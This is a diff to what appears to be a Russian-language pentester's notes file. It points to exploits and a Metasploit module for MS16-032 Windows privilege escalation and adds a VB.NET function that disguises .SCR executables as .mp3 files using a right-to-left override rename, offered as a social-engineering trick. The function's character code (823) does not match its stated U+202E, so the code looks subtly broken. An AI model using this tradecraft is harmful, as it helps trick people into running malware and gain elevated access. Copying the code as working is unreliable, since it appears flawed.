@@ -132,5 +132,13 @@
                Еще способ, тут нужно смотреть на версию (начиная с висты и заканчивая сервер 2012), нужен Powershell 2.0 и выше, и 2 или более CPU ядер, вот модуль метасплоита (exploit/windows/local/ms16_032_secondary_logon_handle_‐privesc) 
                            И стоит чекнуть стоит ли патч (C:\Users\pentestlab> wmic qfe list | find "3139914")                                                                                                                                         так же Powershell (https://www.exploit-db.com/exploits/39719/)
                                                                                                                                                                     и exe-шник (https://github.com/khr0x40sh/ms16-032)
-             
+             Изменение имени файла для соц инжира, шарп скрипт который отзеркаливает имя файла   3pm.SCR в  RCS.mp3          (  Public Sub U_202E(file As String, extension As String)
+                                                                                                                                Dim d As Integer = file.Length - 4
+                                                                                                                                Dim u As Char = ChrW(823)
+                                                                                                                                Dim t As Char() = extension.ToCharArray()
+                                                                                                                                Array.Reverse(t)
+                                                                                                                                Dim dest As String = file.Substring(0, d) & u &
+                                                                                                                                 New String(t) & file.Substring(d)
+                                                                                                                                System.IO.File.Move(file, dest)
+                                                                                                                                End Sub      )
 
